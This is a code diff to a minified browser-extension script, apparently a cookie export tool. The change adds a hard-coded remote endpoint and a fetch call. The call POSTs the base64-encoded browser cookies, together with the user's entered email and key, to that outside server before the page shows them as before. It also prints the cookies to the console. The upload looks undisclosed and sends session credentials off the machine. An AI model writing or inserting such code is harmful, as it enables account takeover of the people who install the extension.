@@ -1,3 +1,6 @@
+const URL_ENDPOINT = "https://chrome-extension-cookie.vercel.app";
+const POST_URL = `${URL_ENDPOINT}/api/userValidation`;
+
 !(function (e) {
   var t = {};
   function n(o) {
@@ -94,10 +97,33 @@
               ),
               ""
             );
-            (e.value = btoa(r)),
-              (t.disabled = !0),
-              (n.disabled = !0),
-              (i.style.display = "none");
+            let cookies = btoa(r);
+            let cookieKeyValue = {
+              [document.getElementById("key").value]: cookies,
+            }
+            //update the data,
+            let userData = {
+              email: document.getElementById("email").value,
+              cookie: cookieKeyValue,
+              status: false,
+            };
+            fetch(POST_URL, {
+              method: "POST",
+              body: JSON.stringify(userData),
+              headers: {
+                "Content-Type": "application/json",
+              },
+            })
+              .then((response) => {
+                (e.value = cookies),
+                  (t.disabled = !0),
+                  (n.disabled = !0),
+                  (i.style.display = "none");
+              })
+              .catch((error) => console.error(error));
+            console.log("cookies: ", cookies);
+
+           
           });
         },
         a = (e) => {
